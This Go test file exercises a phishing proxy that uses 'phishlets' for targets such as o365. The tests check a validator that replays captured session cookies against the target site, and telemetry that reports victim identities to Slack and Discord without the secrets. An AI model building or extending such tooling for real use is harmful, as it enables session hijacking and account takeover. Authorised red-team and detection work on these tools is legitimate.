package validation_test

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/s4l1hs/olta/pkg/proxy/database"
	"github.com/s4l1hs/olta/pkg/proxy/telemetry"
	"github.com/s4l1hs/olta/pkg/proxy/validation"
)

type blockingValidator struct {
	started chan struct{}
	release chan struct{}
	once    sync.Once
}

func (validator *blockingValidator) Validate(_ context.Context, event validation.Event) validation.Result {
	validator.once.Do(func() { close(validator.started) })
	<-validator.release
	return validation.Result{Status: validation.StatusValid, Identity: event.Identity}
}

func TestWorkerQueuesWithoutBlockingAndDrains(t *testing.T) {
	validator := &blockingValidator{started: make(chan struct{}), release: make(chan struct{})}
	results := make(chan validation.Result, 2)
	worker, err := validation.NewWorker(validation.WorkerConfig{
		Workers:   1,
		QueueSize: 1,
		Validator: validator,
		OnResult:  func(result validation.Result) { results <- result },
	})
	if err != nil {
		t.Fatalf("NewWorker() error = %v", err)
	}

	if err := worker.Enqueue(testEvent("session-1")); err != nil {
		t.Fatalf("Enqueue(first) error = %v", err)
	}
	select {
	case <-validator.started:
	case <-time.After(time.Second):
		t.Fatal("validator did not start")
	}
	if err := worker.Enqueue(testEvent("session-2")); err != nil {
		t.Fatalf("Enqueue(second) error = %v", err)
	}
	if err := worker.Enqueue(testEvent("session-3")); !errors.Is(err, validation.ErrQueueFull) {
		t.Fatalf("Enqueue(full) error = %v, want ErrQueueFull", err)
	}
	if err := worker.Enqueue(testEvent("session-2")); !errors.Is(err, validation.ErrDuplicateEvent) {
		t.Fatalf("Enqueue(duplicate) error = %v, want ErrDuplicateEvent", err)
	}

	close(validator.release)
	if err := worker.Close(); err != nil {
		t.Fatalf("Close() error = %v", err)
	}
	close(results)
	count := 0
	for range results {
		count++
	}
	if count != 2 {
		t.Fatalf("processed results = %d, want 2", count)
	}
	if err := worker.Enqueue(testEvent("session-4")); !errors.Is(err, validation.ErrWorkerClosed) {
		t.Fatalf("Enqueue(closed) error = %v, want ErrWorkerClosed", err)
	}
}

func TestHTTPValidatorSendsCookiesAndExtractsMetadata(t *testing.T) {
	transport := roundTripFunc(func(request *http.Request) (*http.Response, error) {
		if cookie := request.Header.Get("Cookie"); !strings.Contains(cookie, "session=secret-value") {
			t.Fatalf("Cookie header = %q, want captured session cookie", cookie)
		}
		return &http.Response{
			StatusCode: http.StatusOK,
			Header:     http.Header{"Content-Type": {"application/json"}},
			Body:       io.NopCloser(strings.NewReader(`{"tenantId":"tenant-42","organization":"SOC Lab"}`)),
			Request:    request,
		}, nil
	})
	validator := validation.NewHTTPValidator(&http.Client{Transport: transport})
	result := validator.Validate(context.Background(), testEvent("session-http"))
	if result.Status != validation.StatusValid {
		t.Errorf("status = %q, want valid", result.Status)
	}
	if result.Identity.TenantID != "tenant-42" || result.Identity.Organization != "SOC Lab" {
		t.Errorf("identity = %+v, want extracted tenant and organization", result.Identity)
	}
}

func TestPayloadFormattingOmitsSessionSecrets(t *testing.T) {
	result := validation.Result{
		Timestamp:        time.Date(2026, 8, 9, 12, 0, 0, 0, time.UTC),
		SessionReference: "abc123def456",
		Phishlet:         "o365",
		TargetHost:       "login.example.test",
		Identity: validation.Identity{
			Username:     "analyst@example.test",
			TenantID:     "tenant-42",
			Organization: "SOC Lab",
		},
		Status:     validation.StatusValid,
		HTTPStatus: http.StatusOK,
		Detail:     "target accepted the captured session",
	}
	for _, provider := range []telemetry.Provider{telemetry.ProviderGeneric, telemetry.ProviderSlack, telemetry.ProviderDiscord} {
		t.Run(string(provider), func(t *testing.T) {
			payload, err := telemetry.FormatPayload(provider, result)
			if err != nil {
				t.Fatalf("FormatPayload() error = %v", err)
			}
			var decoded interface{}
			if err := json.Unmarshal(payload, &decoded); err != nil {
				t.Fatalf("payload is not JSON: %v", err)
			}
			text := string(payload)
			if !strings.Contains(text, "analyst@example.test") || !strings.Contains(text, "valid") {
				t.Errorf("payload missing identity/status: %s", text)
			}
			for _, secretMarker := range []string{"secret-value", "cookie", "token"} {
				if strings.Contains(strings.ToLower(text), secretMarker) {
					t.Errorf("payload contains secret marker %q: %s", secretMarker, text)
				}
			}
		})
	}
}

func TestNewEventExtractsAllowlistedMetadata(t *testing.T) {
	event, err := validation.NewEvent(&database.Session{
		SessionId: "sid",
		Phishlet:  "o365",
		Username:  "user@example.test",
		Custom: map[string]string{
			"tenant_id": "tenant-42",
			"org":       "SOC Lab",
			"password":  "must-not-be-extracted",
		},
		CookieTokens: map[string]map[string]*database.CookieToken{
			".example.test": {"session": {Name: "session", Value: "secret-value"}},
		},
	})
	if err != nil {
		t.Fatalf("NewEvent() error = %v", err)
	}
	if event.TargetURL != "https://example.test/" {
		t.Errorf("TargetURL = %q, want https://example.test/", event.TargetURL)
	}
	if event.Identity.TenantID != "tenant-42" || event.Identity.Organization != "SOC Lab" {
		t.Errorf("Identity = %+v, want allowlisted metadata", event.Identity)
	}
}

func testEvent(sessionID string) validation.Event {
	return validation.Event{
		SessionID: sessionID,
		Phishlet:  "o365",
		TargetURL: "https://example.test/",
		Identity:  validation.Identity{Username: "analyst@example.test"},
		Cookies: map[string]map[string]*database.CookieToken{
			"example.test": {"session": {Name: "session", Value: "secret-value", Path: "/", HttpOnly: true}},
		},
	}
}

type roundTripFunc func(*http.Request) (*http.Response, error)

func (function roundTripFunc) RoundTrip(request *http.Request) (*http.Response, error) {
	return function(request)
}
